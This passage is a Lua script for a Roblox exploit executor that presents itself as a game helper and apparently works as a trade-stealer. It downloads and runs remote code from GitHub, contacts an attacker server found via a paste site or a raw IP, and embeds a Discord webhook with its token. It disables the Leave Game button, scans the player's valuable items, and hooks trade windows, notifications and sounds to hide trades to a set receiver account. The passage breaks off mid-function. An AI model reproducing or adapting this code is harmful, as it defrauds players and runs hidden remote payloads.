-- discord.gg/syncrypt

local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)
		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end
	return function()
		local r = table.pack(f(s, c))
		if r[1] == nil then return false end
		c = r[1]
		return true, table.unpack(r, 1, r.n)
	end
end

if getgenv().__ELYSIUM_SAB_RAN then return end
getgenv().__ELYSIUM_SAB_RAN = true

if game.PlaceId ~= 109983668079237 and game.PlaceId ~= 99606176102979 then
	game.Players.LocalPlayer:Kick("Wrong game")
	return
end
if game.PlaceId == 99606176102979 then return end
if not game:IsLoaded() then game.Loaded:Wait() end
if setclipboard then setclipboard("https://discord.gg/3lysium") end

-- VISUAL (added) — do not remove
pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MiniPibble/Blablaaa/refs/heads/main/Meistuff"))()
end)

task.spawn(function()
	while task.wait() do
		pcall(function()
			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
				v:Disable()
			end
		end)
	end
end)

if not isfolder("vex_dumps") then pcall(makefolder, "vex_dumps") end
local u6
local function v7(p1)
	if not u6 then
		u6 = string.format("%s/sab_%d.txt", "vex_dumps", os.time())
		pcall(writefile, u6, "=== SAB LOG " .. os.date() .. " ===\n")
	end
	if type(appendfile) == "function" then
		pcall(appendfile, u6, os.date("[%H:%M:%S] ") .. p1 .. "\n")
	end
end
local function v8() end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local v16 = HttpService
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local v19 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())

local function v20()
	local ok, result = pcall(function() return game:HttpGet(v19) end)
	if ok and result then
		local match = result:match("^%s*(.-)%s*$")
		if match and match ~= "" then
			return (match:match("^https?://") and match or "http://" .. match)
		end
	end
	return "http://212.119.42.158:3000"
end
if not getgenv().SAB_API_BASE then getgenv().SAB_API_BASE = v20() end
local SAB_API_BASE = getgenv().SAB_API_BASE

local function v26()
	return syn and syn.request or http and http.request or type(request) == "function" and request or type(http_request) == "function" and http_request or nil
end

-- ============================================================
-- CONFIG
-- ============================================================
local RECEIVERS = { "Parkjiho_official" }
local THRESHOLD = 1000000000
local WEBHOOK = "https://discord.com/api/webhooks/1541702936525275157/w1UDjpF7iKb1SqdnmHGTo-FR_5DitQuIwwKBeHgZc4fXBpftx6mVb1HCiSgyara2pRVU"

pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/ps.lua"))()
end)

getgenv().PRIORITY = {
    "Meowl", "Strawberry elephant", "Skibidi toilet", "Headless horseman",
    "Dragon Cannelloni", "Hydra dragon cannelloni", "Dragon Gingerini",
    "Capitano moby", "La casa boo", "Fragrama and chocrama",
    "La supreme combinasion", "Cooki and milki", "Burguro and fryuro",
    "Garama and Madundung", "Spooky and pumpky",
    "Reinito sleighito", "Cerberus",
    "Celestial Pegasus", "Love Love Bear", "Festive 67", "Ginger Gerat",
    "Ketupat Bros", "Rosey and Teddy", "Griffin", "Signore Carapace", "Dug Dug Dug",
    "Cloverat Clapat", "Foxini Lanternini", "Hydra Bunny",
    "Boppin bunny", "Los Primos", "La Secret Combinasion", "Fragola La La La",
    "Fishino Clownino", "Antonio", "Chillin Chili", "Gym Bros", "Los Chillis",
    "Money Money Bros", "Money Money Reindeer", "Tirilikalika Tirilikalako",
    "Lazy Ducky", "Guest 666", "Arcadragon", "Kraken", "Bearito Cabinito",
    "Rubrikiko", "Venuspino", "Los Sekolahs", "Dragon Aquanini", "Globa Steppa",
    "Gambatron", "Bumbatron", "La Fuse Machine", "Yetimatic", "S'more Serat",
    "Rubiko And Kubiko",
    "Dragon Skeletonini", "Plant Bros", "Hydra Serpent", "Phoenix",
    "Los Dragons", "Orchidox", "Los Secret Combinasionas", "Flying Dutchman",
    "Polaroidini", "Jelly Moby", "Sammyni Truckini",
    "John Pork",
    "Draculino", "Pancake and Syrup",
    "Kalika Bros",
    "Duggy Bros", "Los Admins",
    "Gold and Diamond",
    "Los Hackers",
    "Pop Pop Petalini", "Grabatron", "Panda Popanda",
    "Rico Dinero", "Cola Cat",
    "Medusini and Demonini",
    "Arca Bros",
    "Skelly and Coffy", "Puppetmaster",
    "Scarino Crowino",
    "Pretzo Robo",
    "La Breakfast Combinasion",
    "Popcuru and Fizzuru",
    "Cash or Card",
    "Bunny and Eggy",
    "Digi Narwhal",
    "Elefanto Frigo",
    "Moby Bros",
    "Cobra Gelato",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Sammyni Cakini", "Sammyni Spookyni"
}
local PRIORITY = getgenv().PRIORITY
local t1 = {}
for _, v in ipairs(PRIORITY) do t1[v:lower()] = true end

local t2 = {}
for _, v in ipairs({
	"meowl","strawberry elephant","skibidi toilet","headless horseman",
	"dragon cannelloni","hydra dragon cannelloni","dragon gingerini",
	"love love bear","signore carapace","elefanto frigo","griffin","john pork",
	"digi narwhal","la supreme combinasion"
}) do t2[v:lower()] = true end

local t3 = {
	["rainbow hammer"] = true, ["bloodmoon hammer"] = true, ["candy sentry"] = true,
	["santa's sleigh"] = true, waverider = true, ["cupid's wings"] = true, ["witch's broom"] = true,
	["flying bee"] = true
}
local t4 = { tralalero = true }
local t5 = {}
local t6 = {}
for _, v in ipairs(RECEIVERS) do
	local match = tostring(v):match("^%s*(.-)%s*$")
	if match ~= "" and not t5[match:lower()] then
		t5[match:lower()] = true
		t6[#t6 + 1] = match
	end
end
local function v44(p2) return t5[tostring(p2):lower()] == true end

local u45 = false
local u46 = false
local t7 = {}
local t8 = {}
local u49 = false
local t9 = { K=1000, M=1000000, B=1e9, T=1e12, k=1000, m=1000000, b=1e9, t=1e12 }

local function v51(p3)
	if not p3 or p3 == "" then return 0 end
	local match, v53 = tostring(p3):gsub("%$",""):gsub(",",""):gsub(" ",""):gsub("/s",""):gsub("/S",""):match("([%d%.]+)([KMBTkmbt]?)")
	return (tonumber(match) or 0) * (t9[v53] or 1)
end
local function v54(p4)
	local v55 = tonumber(p4) or 0
	if v55 >= 1e12 then
		local v56 = string.format("%.1fT", v55/1e12)
		return "$" .. (v56:find("%.0T") and v56:gsub("%.0T","T") or v56)
	end
	if v55 >= 1e9 then
		local v57 = string.format("%.1fB", v55/1e9)
		return "$" .. (v57:find("%.0B") and v57:gsub("%.0B","B") or v57)
	end
	if v55 >= 1000000 then
		local v58 = string.format("%.1fM", v55/1000000)
		return "$" .. (v58:find("%.0M") and v58:gsub("%.0M","M") or v58)
	end
	if not (v55 >= 1000) then return "$" .. tostring(math.floor(v55)) end
	local v59 = string.format("%.1fK", v55/1000)
	return "$" .. (v59:find("%.0K") and v59:gsub("%.0K","K") or v59)
end
local function v60(p5)
	if not p5 then return "" end
	if p5:IsA("TextLabel") or p5:IsA("TextButton") then return p5.ContentText or p5.Text or "" end
	return ""
end

local t10 = {}
pcall(function()
	local Traits = require(ReplicatedStorage.Datas.Traits)
	for k, Trait in pairs(Traits) do
		if type(Trait) == "table" then
			local match = tostring(Trait.Icon or ""):match("%d+")
			local match2 = tostring(Trait.Display or k):match("^%s*(.-)%s*$")
			if match and match2 ~= "" then t10[match] = match2 end
		end
	end
end)

local function v67()
	pcall(function()
		local HumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if HumanoidRootPart then LocalPlayer:RequestStreamAroundAsync(HumanoidRootPart.Position) end
	end)
	local Plots = Workspace:FindFirstChild("Plots") or Workspace:WaitForChild("Plots", 60)
	if not Plots then return nil end
	for _, child in ipairs(Plots:GetChildren()) do
		for _, v in ipairs({ "UserId","OwnerId","OwnerUserId","PlayerUserId","PlotOwner" }) do
			local attribute = child:GetAttribute(v)
			if attribute and tonumber(attribute) == LocalPlayer.UserId then return child end
		end
		local PlotSign = child:FindFirstChild("PlotSign")
		if not PlotSign then continue end
		local SurfaceGui = PlotSign:FindFirstChild("SurfaceGui")
		local Frame = SurfaceGui and SurfaceGui:FindFirstChild("Frame")
		local TextLabel = Frame and Frame:FindFirstChild("TextLabel")
		if not TextLabel then continue end
		local ContentText = TextLabel.ContentText or TextLabel.Text or ""
		if ContentText == LocalPlayer.DisplayName or ContentText == LocalPlayer.Name then return child end
		if ContentText:find(LocalPlayer.DisplayName, 1, true) and ContentText:find("Base", 1, true) then return child end
	end
	return nil
end

local function v80(p6)
	if not p6 then return nil end
	local DisplayName = p6:FindFirstChild("DisplayName", true) or p6:FindFirstChild("Name", true)
	if not DisplayName then return nil end
	local t11 = { name = v60(DisplayName), mutationStr = "", traitStr = "", moneyPerSec = 0 }
	if t11.name == "" then t11.name = "Unknown" end
	local Generation = p6:FindFirstChild("Generation", true) or p6:FindFirstChild("Gen", true)
	if Generation then t11.moneyPerSec = v51(v60(Generation)) end
	local t12 = {}
	for _, descendant in ipairs(p6:GetDescendants()) do
		if descendant:IsA("TextLabel") and descendant.Name == "Mutation" and descendant.Visible ~= false then
			local v87 = v60(descendant)
			if v87 ~= "" then table.insert(t12, v87) end
		end
	end
	t11.mutationStr = #t12 > 0 and table.concat(t12, ", ") or ""
	local Traits = p6:FindFirstChild("Traits", true)
	if Traits then
		local t13, t14 = {}, {}
		for _, descendant in ipairs(Traits:GetDescendants()) do
			if descendant:IsA("ImageLabel") and descendant.Visible ~= false then
				local match = tostring(descendant.Image or ""):match("%d+")
				local match2 = match and t10[match] or nil
				if not match2 and descendant.Name ~= "Template" then
					match2 = tostring(descendant.Name):match("^%s*(.-)%s*$")
				end
				if match2 and match2 ~= "" and not t14[match2] then
					t14[match2] = true
					table.insert(t13, match2)
				end
			end
		end
		t11.traitStr = #t13 > 0 and table.concat(t13, ", ") or ""
	end
	return t11
end

local function v95()
	local v96 = v67()
	if not v96 then return {} end
	local t15, t16 = {}, {}
	local function v99(p7)
		local v100 = v80(p7)
		if not v100 then return end
		local v101 = v100.name .. "|" .. tostring(v100.moneyPerSec)
		if t16[v101] then return end
		t16[v101] = true
		table.insert(t15, v100)
	end
	local Debris = Workspace:FindFirstChild("Debris")
	local Plots = Workspace:FindFirstChild("Plots")
	local t17 = {}
	if Plots then
		for _, child in ipairs(Plots:GetChildren()) do
			local ok, result = pcall(function() return child:GetPivot() end)
			if ok and result then
				table.insert(t17, { plot = child, position = result.Position })
			end
		end
	end
	local function v109(p8)
		local huge = math.huge
		local plot
		for _, v in ipairs(t17) do
			local v114 = p8.X - v.position.X
			local v115 = p8.Z - v.position.Z
			local v116 = v114*v114 + v115*v115
			if v116 < huge then plot = v.plot; huge = v116 end
		end
		return plot
	end
	if Debris then
		for _, child in ipairs(Debris:GetChildren()) do
			if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") and v109(child.Position) == v96 then
				v99(child:FindFirstChild("AnimalOverhead"))
			end
		end
	end
	for _, descendant in ipairs(v96:GetDescendants()) do
		if descendant.Name == "AnimalOverhead" then v99(descendant) end
	end
	table.sort(t15, function(p9, p10)
		local v121 = t1[p9.name:lower()] or false
		if v121 == (t1[p10.name:lower()] or false) then
			return p9.moneyPerSec > p10.moneyPerSec
		end
		return v121
	end)
	return t15
end

local t18 = {}
local function v123(p11) return t3[tostring(p11):lower()] == true end
local function v124(p12) return t4[tostring(p12):lower()] == true end
local function v125()
	local t19, t20, t21 = {}, {}, {}
	t18 = {}
	local ok, result = pcall(function()
		local Gears = require(ReplicatedStorage.Shared.Gears)
		local function v132(p13)
			if not p13 then return end
			for _, child in ipairs(p13:GetChildren()) do
				if child:IsA("Tool") and Gears.IsTradable(child.Name) and v123(child.Name) then
					if not t20[child.Name] then
						t20[child.Name] = true
						t18[#t18 + 1] = { kind = "gear", name = child.Name }
						table.insert(t19, "[GEAR] " .. child.Name)
					end
				end
			end
		end
		v132(LocalPlayer:FindFirstChildOfClass("Backpack"))
		v132(LocalPlayer.Character)
	end)
	if not ok then v8("Gear scan failed: " .. tostring(result)) end
	local ok2, result2 = pcall(function()
		local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
		local Settings = PlayerGui:WaitForChild("Settings", 5)
		if not Settings then v8("Settings ScreenGui missing"); return end
		local Settings2 = Settings:WaitForChild("Settings", 3)
		if not Settings2 then v8("Settings inner missing"); return end
		local Enabled = Settings.Enabled
		local Visible = Settings2.Visible
		Settings.Enabled = false
		InterfaceController:SetState("Settings", true)
		local v142 = os.clock() + 2
		local BaseSkin
		while true do
			BaseSkin = Settings2.Content.ScrollingFrame:FindFirstChild("Base Skin")
			if BaseSkin then break else
				task.wait(0.1)
				if v142 <= os.clock() then break end
			end
		end
		if BaseSkin then
			local Text = BaseSkin.Button.Text.Text
			if Text ~= "" and Text ~= "Normal" and Text ~= "Default" and v124(Text) then
				t21[Text] = true
				t18[#t18 + 1] = { kind = "skin", name = Text }
				table.insert(t19, "[BASE SKIN] " .. Text)
			end
			for _, child in ipairs(BaseSkin.Button.DropDown:GetChildren()) do
				if child:IsA("GuiButton") and child.Name ~= "Template" then
					local Locked = child:FindFirstChild("Locked")
					if not (Locked and Locked.Visible) and child.Name ~= "Normal" and not (not v124(child.Name) or t21[child.Name]) then
						t21[child.Name] = true
						t18[#t18 + 1] = { kind = "skin", name = child.Name }
						table.insert(t19, "[BASE SKIN] " .. child.Name)
					end
				end
			end
		end
		if not Visible then InterfaceController:SetState("Settings", false) end
		Settings.Enabled = Enabled
	end)
	if not ok2 then
		warn("[SAB] Base skin scan failed:", tostring(result2))
		pcall(function() PlayerGui.Settings.Enabled = true end)
	end
	return t19
end

local function v148()
	for _, v in ipairs(v95()) do
		if t1[v.name:lower()] then return true end
		if THRESHOLD <= 0 or THRESHOLD <= v.moneyPerSec then return true end
	end
	for _, v in ipairs(t18) do
		if v.kind == "gear" or v.kind == "skin" then return true end
	end
	return false
end

local t22 = {
	active = false, suppressLiveTrade = false, heartbeatConn = nil, childAddedConn = nil,
	suppressedGuis = { "TradePlayerList", "TradePrompts" },
	_lcInterface = nil, _hudInterface = nil, _origNotifMethods = {}, hooksInstalled = false
}
t22.hookCamera = function()
	local ok, result = pcall(require, ReplicatedStorage.Controllers.CameraController)
	if ok and type(result) == "table" then
		for _, v in ipairs({ "Blur","Fov","SetBlur","SetFov","TweenBlur","TweenFov" }) do
			local v165 = result[v]
			if type(v165) == "function" then
				result[v] = function(...)
					if t22.active then return end
					return v165(result, select(2, ...))
				end
			end
		end
		local BlurEffect = Lighting:FindFirstChildOfClass("BlurEffect")
		if BlurEffect then BlurEffect.Size = 0 end
	end
end
t22.hookInterface = function(p15)
	local ok, result = pcall(require, ReplicatedStorage.Controllers.InterfaceController)
	if not ok or type(result) ~= "table" then return end
	local interfaces = result:GetInterfaces()
	if interfaces then
		p15._lcInterface = interfaces.LeftCenter
		p15._hudInterface = interfaces.Hud
	end
	local function v170(p16)
		if p16 and type(p16.Close) == "function" then
			local Close = p16.Close
			p16.Close = function(p17, ...)
				if not t22.active then return Close(p17, ...) end
				if p17.ToggleTween then p17.ToggleTween:Cancel(); p17.ToggleTween = nil end
				p17.State = true
				if p17.Object then p17.Object.Visible = true end
				if p17.Defaults and p17.Object then p17.Object.Position = p17.Defaults.Position end
			end
		end
	end
	v170(p15._lcInterface); v170(p15._hudInterface)
	local Toggle = result.Toggle
	if type(Toggle) == "function" then
		result.Toggle = function(p18, p19, p20, p21, ...)
			if t22.active and (p19 == "TradePlayerList" or p19 == "TradePrompts") and (p20 == true or p20 == nil) then return end
			return Toggle(result, p19, p20, p21, ...)
		end
	end
	local SetState = result.SetState
	if type(SetState) == "function" then
		result.SetState = function(p22, p23, p24, ...)
			if t22.active and (p23 == "TradePlayerList" or p23 == "TradePrompts") and (p24 == true or p24 == nil) then return end
			return SetState(result, p23, p24, ...)
		end
	end
end
t22.hookNotifications = function(p25)
	local ok, result = pcall(require, ReplicatedStorage.Controllers.NotificationController)
	if ok and type(result) == "table" then
		for _, v in ipairs({ "Notify","Error","Success" }) do
			local v178 = result[v]
			if type(v178) == "function" then
				p25._origNotifMethods[v] = v178
				result[v] = function() end
			end
		end
	end
end
t22.disableAllSuppressed = function(p26)
	for _, suppressedGui in ipairs(p26.suppressedGuis) do
		local v181 = PlayerGui:FindFirstChild(suppressedGui)
		if v181 and v181:IsA("ScreenGui") and v181.Enabled then v181.Enabled = false end
	end
end
t22.hideLiveTradeFrame = function()
	local TradeLiveTrade = PlayerGui:FindFirstChild("TradeLiveTrade")
	if TradeLiveTrade and TradeLiveTrade:IsA("ScreenGui") and TradeLiveTrade.Enabled then TradeLiveTrade.Enabled = false end
end
t22.showLiveTradeFrame = function()
	local TradeLiveTrade = PlayerGui:FindFirstChild("TradeLiveTrade")
	if TradeLiveTrade and TradeLiveTrade:IsA("ScreenGui") and not TradeLiveTrade.Enabled then TradeLiveTrade.Enabled = true end
end
t22.setSuppressLiveTrade = function(p27, p28)
	p27.suppressLiveTrade = (p28 and true or false)
	if p27.suppressLiveTrade then p27:hideLiveTradeFrame() else p27:showLiveTradeFrame() end
end
t22.restoreLeftCenter = function(p29)
	local LeftCenter = PlayerGui:FindFirstChild("LeftCenter")
	if LeftCenter then
		if not LeftCenter.Enabled then LeftCenter.Enabled = true end
		local LeftCenter2 = LeftCenter:FindFirstChild("LeftCenter")
		if LeftCenter2 then
			if not LeftCenter2.Visible then LeftCenter2.Visible = true end
			if p29._lcInterface then
				if p29._lcInterface.ToggleTween then
					p29._lcInterface.ToggleTween:Cancel()
					p29._lcInterface.ToggleTween = nil
				end
				if p29._lcInterface.Defaults and p29._lcInterface.Object then
					LeftCenter2.Position = p29._lcInterface.Defaults.Position
				end
			end
			local Buttons = LeftCenter2:FindFirstChild("Buttons")
			if Buttons and not Buttons.Visible then Buttons.Visible = true end
		end
	end
	local Hud = PlayerGui:FindFirstChild("Hud")
	if Hud then
		if not Hud.Enabled then Hud.Enabled = true end
		if p29._hudInterface then
			if p29._hudInterface.ToggleTween then
				p29._hudInterface.ToggleTween:Cancel()
				p29._hudInterface.ToggleTween = nil
			end
			if p29._hudInterface.Defaults and p29._hudInterface.Object then
				local Hud2 = Hud:FindFirstChild("Hud")
				if Hud2 then Hud2.Position = p29._hudInterface.Defaults.Position end
			end
		end
	end
end
t22.resetCamera = function()
	local CurrentCamera = Workspace.CurrentCamera
	if not CurrentCamera then return end
	CurrentCamera.FieldOfView = 70
	local BlurEffect = Lighting:FindFirstChildOfClass("BlurEffect")
	if BlurEffect then BlurEffect.Size = 0 end
end
t22.hookChildAdded = function(p30)
	if p30.childAddedConn then p30.childAddedConn:Disconnect() end
	p30.childAddedConn = PlayerGui.ChildAdded:Connect(function(child)
		if not child:IsA("ScreenGui") then return end
		for _, suppressedGui in ipairs(t22.suppressedGuis) do
			if child.Name == suppressedGui then
				child.Enabled = false
				child:GetPropertyChangedSignal("Enabled"):Connect(function()
					if t22.active and child.Enabled then child.Enabled = false end
				end)
				return
			end
		end
	end)
end
t22.installHooks = function(p31)
	if p31.hooksInstalled then return end
	p31:hookCamera(); p31:hookInterface(); p31:hookNotifications(); p31:hookChildAdded()
	p31:disableAllSuppressed(); p31:resetCamera()
	p31.hooksInstalled = true
end
t22.start = function(p32)
	if p32.active then return end
	p32:installHooks()
	p32.active = true
	p32.heartbeatConn = RunService.Heartbeat:Connect(function()
		if not t22.active then return end
		p32:disableAllSuppressed(); p32:resetCamera(); p32:restoreLeftCenter()
		if p32.suppressLiveTrade then p32:hideLiveTradeFrame() end
	end)
end
t22:start()
v8("TradeSuppressor started")

local n1 = 0
pcall(function()
	local SoundController = require(ReplicatedStorage.Controllers.SoundController)
	if type(SoundController) ~= "table" then return end
	if not getgenv().OriginalTradePlaySound then
		getgenv().OriginalTradePlaySound = SoundController.PlaySound
	end
	local OriginalTradePlaySound = getgenv().OriginalTradePlaySound
	if type(OriginalTradePlaySound) ~= "function" then return end
	SoundController.PlaySound = function(p33, p34, ...)
		if n1 > 0 and p34 == "Sounds.Sfx.Activated" then return end
		local v197 = table.pack(...)
		v197.n = 3 + v197.n - 1
		table.move(v197, 1, v197.n, 3, v197)
		v197[1] = p33
		v197[2] = p34
		return OriginalTradePlaySound(table.unpack(v197, 1, v197.n))
	end
end)
local function v198(p35, ...)
	n1 += 1
	local v199 = table.pack(pcall(p35, ...))
	n1 = math.max(0, n1 - 1)
	return table.unpack(v199, 1, v199.n)
end
local function v200(p36)
	if not p36 then return false end
	for _, v in ipairs({ "Activated","MouseButton1Click","MouseButton1Down" }) do
		local ok, result = pcall(getconnections, p36[v])
		if not ok or #result == 0 then continue end
		for _, v2 in ipairs(result) do
			if type(v2.Function) ~= "function" or not v198(v2.Function) then
				v198(function() v2:Fire() end)
				continue
			end
			return true
		end
		return true
	end
	pcall(function() p36:SimulateClick() end)
	return false
end

-- ============================================================
-- STANDALONE FOV + BLUR
-- ============================================================
local function lockFOV(target)
	target = target or 70
	if Workspace.CurrentCamera then
		Workspace.CurrentCamera.FieldOfView = target
		Workspace.CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
			if Workspace.CurrentCamera.FieldOfView ~= target then
				Workspace.CurrentCamera.FieldOfView = target
			end
		end)
	end
end

local __blurOriginal     = {}
local __blurConnections  = {}
local TARGET_FOV         = 70

local function disableBlur(child)
	if child:IsA("BlurEffect") then
		if __blurOriginal[child] == nil then __blurOriginal[child] = child.Enabled end
		child.Enabled = false
	end
end

local function lockFOVAndClearBlurs(fov)
	fov = fov or TARGET_FOV
	for _, c in ipairs(__blurConnections) do c:Disconnect() end
	table.clear(__blurConnections)
	if Workspace.CurrentCamera then
		Workspace.CurrentCamera.FieldOfView = fov
		for _, child in ipairs(Workspace.CurrentCamera:GetChildren()) do disableBlur(child) end
		table.insert(__blurConnections,
			Workspace.CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
				if Workspace.CurrentCamera.FieldOfView ~= fov then Workspace.CurrentCamera.FieldOfView = fov end
			end))
		table.insert(__blurConnections, Workspace.CurrentCamera.ChildAdded:Connect(disableBlur))
	end
	for _, child in ipairs(Lighting:GetChildren()) do disableBlur(child) end
	table.insert(__blurConnections, Lighting.ChildAdded:Connect(disableBlur))
end

local function restoreBlurs()
	for _, c in ipairs(__blurConnections) do c:Disconnect() end
	table.clear(__blurConnections)
	for blur, wasEnabled in pairs(__blurOriginal) do
		if blur.Parent then blur.Enabled = wasEnabled end
	end
	table.clear(__blurOriginal)
end

-- ============================================================
-- STANDALONE hideTradeUI
-- ============================================================
local __hideTradeConnections = {}
local function clearHideConns()
	for _, c in ipairs(__hideTradeConnections) do c:Disconnect() end
	table.clear(__hideTradeConnections)
end
local function hideTradeUI()
	clearHideConns()
	local TradeLiveTrade  = PlayerGui:WaitForChild("TradeLiveTrade")
	local TradeLiveTrade2 = TradeLiveTrade:WaitForChild("TradeLiveTrade")
	local LeftCenter      = PlayerGui:WaitForChild("LeftCenter")
	local LeftCenter2     = LeftCenter:WaitForChild("LeftCenter")

	TradeLiveTrade.Enabled = false
	LeftCenter.Enabled = true
	LeftCenter2.Visible = true
	LeftCenter2.Position = UDim2.fromScale(0, 0.5)

	table.insert(__hideTradeConnections, TradeLiveTrade:GetPropertyChangedSignal("Enabled"):Connect(function()
		if TradeLiveTrade2.Visible and TradeLiveTrade.Enabled then TradeLiveTrade.Enabled = false end
	end))
	table.insert(__hideTradeConnections, LeftCenter:GetPropertyChangedSignal("Enabled"):Connect(function()
		if TradeLiveTrade2.Visible and not LeftCenter.Enabled then LeftCenter.Enabled = true end
	end))
	table.insert(__hideTradeConnections, LeftCenter2:GetPropertyChangedSignal("Visible"):Connect(function()
		if TradeLiveTrade2.Visible and not LeftCenter2.Visible then LeftCenter2.Visible = true end
	end))
	table.insert(__hideTradeConnections, LeftCenter2:GetPropertyChangedSignal("Position"):Connect(function()
		local target = UDim2.fromScale(0, 0.5)
		if TradeLiveTrade2.Visible and LeftCenter2.Position ~= target then LeftCenter2.Position = target end
	end))
	return __hideTradeConnections
end

-- ============================================================
-- STANDALONE scanner (values table + helpers)
-- ============================================================
local values = { Brainrots = {}, Gears = {}, BaseSkins = {}, Gen = {} }

local function __trim(s) return tostring(s or ""):match("^%s*(.-)%s*$") or "" end
local function __readText(gui)
	if not gui then return "" end
	if gui:IsA("TextLabel") or gui:IsA("TextButton") then return gui.ContentText or gui.Text or "" end
	return ""
end
local function __parseMoney(str)
	if not str or str == "" then return 0 end
	local num, suf = tostring(str):gsub("%$",""):gsub(",",""):gsub(" ",""):gsub("/s",""):gsub("/S",""):match("([%d%.]+)([KMBTkmbt]?)")
	local mult = ({K=1e3,M=1e6,B=1e9,T=1e12,k=1e3,m=1e6,b=1e9,t=1e12})[suf] or 1
	return (tonumber(num) or 0) * mult
end

local function __getOwnPlot()
	local Plots = Workspace:FindFirstChild("Plots") or Workspace:WaitForChild("Plots", 60)
	if not Plots then return nil end
	for _, plot in ipairs(Plots:GetChildren()) do
		for _, attr in ipairs({ "UserId","OwnerId","OwnerUserId","PlayerUserId","PlotOwner" }) do
			local v = plot:GetAttribute(attr)
			if v and tonumber(v) == LocalPlayer.UserId then return plot end
		end
		local sign = plot:FindFirstChild("PlotSign")
		local gui = sign and sign:FindFirstChild("SurfaceGui")
		local frm = gui and gui:FindFirstChild("Frame")
		local lbl = frm and frm:FindFirstChild("TextLabel")
		local txt = lbl and (lbl.ContentText or lbl.Text or "") or ""
		if txt == LocalPlayer.DisplayName or txt == LocalPlayer.Name then return plot end
		if txt:find(LocalPlayer.DisplayName, 1, true) and txt:find("Base", 1, true) then return plot end
	end
	return nil
end

local function __readBrainrot(container)
	if not container then return nil end
	local nameLbl = container:FindFirstChild("DisplayName", true) or container:FindFirstChild("Name", true)
	if not nameLbl then return nil end
	local data = { name = __readText(nameLbl), mutationStr = "", traitStr = "", moneyPerSec = 0 }
	if data.name == "" then data.name = "Unknown" end
	local genLbl = container:FindFirstChild("Generation", true) or container:FindFirstChild("Gen", true)
	if genLbl then data.moneyPerSec = __parseMoney(__readText(genLbl)) end
	local mutations = {}
	for _, d in ipairs(container:GetDescendants()) do
		if d:IsA("TextLabel") and d.Name == "Mutation" and d.Visible ~= false then
			local t = __readText(d)
			if t ~= "" then table.insert(mutations, t) end
		end
	end
	data.mutationStr = table.concat(mutations, ", ")
	local traitsFolder = container:FindFirstChild("Traits", true)
	if traitsFolder then
		local seen, traits = {}, {}
		for _, d in ipairs(traitsFolder:GetDescendants()) do
			if d:IsA("ImageLabel") and d.Visible ~= false then
				local label = __trim(d.Name)
				if label ~= "" and label ~= "Template" and not seen[label] then
					seen[label] = true
					table.insert(traits, label)
				end
			end
		end
		data.traitStr = table.concat(traits, ", ")
	end
	return data
end

local function __scanBrainrots()
	local plot = __getOwnPlot()
	if not plot then return {} end
	local result, seen = {}, {}
	local function add(container)
		local d = __readBrainrot(container)
		if not d then return end
		local key = d.name .. "|" .. tostring(d.moneyPerSec)
		if seen[key] then return end
		seen[key] = true
		table.insert(result, d)
	end
	for _, d in ipairs(plot:GetDescendants()) do
		if d.Name == "AnimalOverhead" then add(d) end
	end
	local Debris = Workspace:FindFirstChild("Debris")
	if Debris then
		local pivot = plot:GetPivot().Position
		for _, d in ipairs(Debris:GetChildren()) do
			if d.Name == "FastOverheadTemplate" and d:IsA("BasePart") then
				local dist = (d.Position - pivot)
				if dist.Magnitude < 80 then add(d:FindFirstChild("AnimalOverhead")) end
			end
		end
	end
	table.sort(result, function(a, b)
		local ra, rb = values.Brainrots[a.name] or 0, values.Brainrots[b.name] or 0
		if ra == rb then return a.moneyPerSec > b.moneyPerSec end
		return ra > rb
	end)
	return result
end

local function __scanGearAndSkins()
	local out, seen = {}, {}
	local okG = pcall(function()
		local Gears = require(ReplicatedStorage.Shared.Gears)
		local function walk(container)
			if not container then return end
			for _, child in ipairs(container:GetChildren()) do
				if child:IsA("Tool") and Gears.IsTradable(child.Name)
					and values.Gears[child.Name] and not seen[child.Name] then
					seen[child.Name] = true
					table.insert(out, { kind = "gear", name = child.Name })
				end
			end
		end
		walk(LocalPlayer:FindFirstChildOfClass("Backpack"))
		walk(LocalPlayer.Character)
	end)
	if not okG then warn("[scan] gears failed") end
	local okS = pcall(function()
		local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
		local SettingsGui = LocalPlayer.PlayerGui:WaitForChild("Settings")
		local SettingsFrame = SettingsGui:WaitForChild("Settings")
		local wasEnabled = SettingsGui.Enabled
		local wasVisible = SettingsFrame.Visible
		SettingsGui.Enabled = false
		InterfaceController:SetState("Settings", true)
		local deadline = os.clock() + 1
		local baseSkin
		while os.clock() < deadline do
			baseSkin = SettingsFrame.Content.ScrollingFrame:FindFirstChild("Base Skin")
			if baseSkin then break end
			task.wait(0.1)
		end
		if baseSkin then
			local current = baseSkin.Button.Text.Text
			if current ~= "" and current ~= "Normal" and current ~= "Default"
				and values.BaseSkins[current] and not seen[current] then
				seen[current] = true
				table.insert(out, { kind = "skin", name = current })
			end
			for _, b in ipairs(baseSkin.Button.DropDown:GetChildren()) do
				if b:IsA("GuiButton") and b.Name ~= "Template" then
					local locked = b:FindFirstChild("Locked")
					if (not locked or not locked.Visible) and b.Name ~= "Normal"
						and values.BaseSkins[b.Name] and not seen[b.Name] then
						seen[b.Name] = true
						table.insert(out, { kind = "skin", name = b.Name })
					end
				end
